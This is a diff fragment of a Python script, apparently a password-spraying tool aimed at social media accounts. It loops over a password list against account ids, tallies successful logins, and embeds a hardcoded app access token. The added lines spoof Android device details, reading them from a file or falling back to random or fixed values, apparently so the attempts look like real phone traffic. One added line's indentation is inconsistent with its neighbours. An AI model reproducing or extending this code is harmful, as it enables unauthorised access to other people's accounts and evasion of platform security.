@@ -342,6 +342,15 @@ def m1(ids,passlist):
         global loop
         global oks
         sys.stdout.write('\r\r\033[1;37m [MR-ZEE] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
+	infos = open('device_info.txt','r').read()
+        try:
+                version_,model_,brand_name_,width_,height_,build_,operator_,density_=infos.split('$')
+        except:
+                version_ = str(random.randint(7,13))
+                model_ = "Infinix"
+                brand_name_ = "Infinix"
+                width_ = "720"
+                height_ = "1280"
         try:
                 for pas in passlist:
                         accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
